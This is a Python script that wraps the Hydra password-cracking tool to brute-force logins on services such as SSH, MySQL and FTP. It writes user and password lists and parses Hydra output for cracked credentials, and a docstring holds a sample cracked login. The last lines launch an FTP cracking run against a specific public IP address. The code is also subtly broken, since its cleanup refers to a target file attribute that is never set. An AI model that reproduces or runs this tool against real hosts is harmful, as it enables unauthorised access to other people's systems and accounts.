#!/usr/bin/env python
# coding=utf-8

'''
this aim to crack the port such as ssh, mssql, mysql, vnc and so on
'''
import os
import random
import re
import string
import subprocess
from log import logging

class Hydra(object):
    HYDRA = './lib/hydra/hydra.exe'
    def randstr(self, length=16):
        return ''.join(random.sample("qwertyuiopasdfghjklzxcvbnm1234567890", length))
    def __init__(self,username,password):
        self.result = set()
        self.projectid = './data/' + self.randstr()
        if not os.path.exists(self.projectid):
           os.mkdir(self.projectid)
        self.fresult    = self.projectid +'/result.txt'
        self.fusername  = self.projectid +'/user.txt'
        self.fpassword  = self.projectid +'/passwd.txt'
        with open(self.fusername,'w') as fu:
            fu.write('\n'.join(username if isinstance(username,list) else [username]))
        with open(self.fpassword,'w') as fp:
            fp.write('\n'.join(password if isinstance(password,list) else [password]))

    def __del__(self):
        os.remove(self.fresult)
        os.remove(self.fusername)
        os.remove(self.fpassword)
        if self.ftarget:
            os.remove(self.ftarget)
        os.removedirs(self.projectid)

    def start(self,service,host,port):
        self.result = set()
        self.service = service
        self.host = host
        self.port = port
        args = {
            'hydra'     :self.HYDRA,
            'username'  :self.fusername,
            'passwd'    :self.fpassword,
            'resultfile':self.fresult,
            'service'   :self.service,
            'host'      :self.host,
            'port'      :self.port
        }

        options = '{hydra} -L {username} -P {passwd} -o {resultfile}'
        options += ' -s {port} {host}'
        options += ' {service}'
        cmd = options.format(**args)
        print(cmd)
        proc = subprocess.Popen(cmd,shell=False,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
        print(proc.pid)
        self.parse_result(proc.stdout)

    def parse_result(self,stdout):
        """
        [21][ftp] host: 10.15.154.142   login: ftpftp   password: h123123a
        """
        try:
            for line in stdout.readlines():
                line = str(line).strip('\r\n')
                if not line:
                    continue
                logging.info(line)
                m = re.findall(r'host: (\S*).*login: (\S*).*password:(.*)', line)
                if m and m[0] and len(m[0]) == 3:
                    username = m[0][1]
                    password = m[0][2].strip()
                    self.result.add((
                        self.service,
                        self.host,
                        self.port,
                        username,
                        password,
                        line))
        except Exception as e:
            logging.error('[PortCrackBase][parse_result_hydra] Exception %s' % e)


s=Hydra('admin','adind')
s.start('ftp','113.105.146.126','21')